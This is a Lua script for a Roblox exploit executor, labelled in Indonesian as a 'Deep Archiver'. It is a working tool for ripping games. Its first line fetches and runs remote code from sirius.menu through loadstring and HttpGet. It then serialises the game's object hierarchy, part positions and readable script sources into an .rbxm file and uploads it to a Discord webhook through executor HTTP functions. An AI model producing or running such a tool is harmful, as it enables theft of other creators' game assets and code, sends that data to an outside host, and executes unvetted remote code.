local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Nyemek Hub | Deep Archiver V4",
    LoadingTitle = "Menyusun Hierarki & Source...",
    LoadingSubtitle = "Fixing Structural Issues"
})

local Tab = Window:CreateTab("Export Manager", 4483362458)
local webhookUrl = ""

Tab:CreateInput({
    Name = "Webhook Discord",
    PlaceholderText = "Tempel Webhook...",
    Callback = function(Text) webhookUrl = Text end,
})

-- Fungsi Rekursif untuk Menyusun Objek secara Berjenjang (Hierarki)
local function GetDeepData(obj)
    if obj:IsA("Terrain") or obj:IsA("Player") then return "" end
    
    local xml = "<Item class=\""..obj.ClassName.."\">\n<Properties>\n"
    xml = xml .. "<string name=\"Name\">"..obj.Name.."</string>\n"
    
    -- MENGAMBIL ISI SCRIPT (Source)
    if obj:IsA("LuaSourceContainer") then
        local s, src = pcall(function() return obj.Source end)
        if s and src then
            -- Bungkus dengan CDATA agar karakter script tidak merusak XML
            xml = xml .. "<ProtectedString name=\"Source\"><![CDATA["..src.."]]></ProtectedString>\n"
        end
    end

    -- MENGAMBIL PROPERTI FISIK (Posisi, Size, Color)
    if obj:IsA("BasePart") then
        xml = xml .. "<Vector3 name=\"Position\"><X>"..obj.Position.X.."</X><Y>"..obj.Position.Y.."</Y><Z>"..obj.Position.Z.."</Z></Vector3>\n"
        xml = xml .. "<Vector3 name=\"Size\"><X>"..obj.Size.X.."</X><Y>"..obj.Size.Y.."</Y><Z>"..obj.Size.Z.."</Z></Vector3>\n"
    end
    xml = xml .. "</Properties>\n"

    -- Memasukkan semua anak objek ke dalam parent-nya (Menjaga Struktur)
    for _, child in pairs(obj:GetChildren()) do
        xml = xml .. GetDeepData(child)
    end
    
    xml = xml .. "</Item>\n"
    return xml
end

local function ExecuteExport(serviceName)
    if webhookUrl == "" then return end
    Rayfield:Notify({Title = "Processing", Content = "Menyusun "..serviceName.."...", Duration = 10})
    
    local finalXml = "<roblox version=\"4\">\n" .. GetDeepData(game:GetService(serviceName)) .. "</roblox>"
    
    local boundary = "----Boundary" .. os.time()
    local body = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\""..serviceName.."_Rapi.rbxm\"\r\nContent-Type: application/octet-stream\r\n\r\n" .. finalXml .. "\r\n--" .. boundary .. "--\r\n"
    
    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
            Body = body
        })
        Rayfield:Notify({Title = "Berhasil", Content = serviceName .. " telah dikirim!", Duration = 5})
    end
end

Tab:CreateButton({Name = "Copy Workspace (Rapi)", Callback = function() ExecuteExport("Workspace") end})
Tab:CreateButton({Name = "Copy StarterGui (Rapi + Script)", Callback = function() ExecuteExport("StarterGui") end})
Tab:CreateButton({Name = "Copy ReplicatedStorage (Rapi)", Callback = function() ExecuteExport("ReplicatedStorage") end})
Tab:CreateButton({Name = "Copy StarterPlayer (Rapi)", Callback = function() ExecuteExport("StarterPlayer") end})
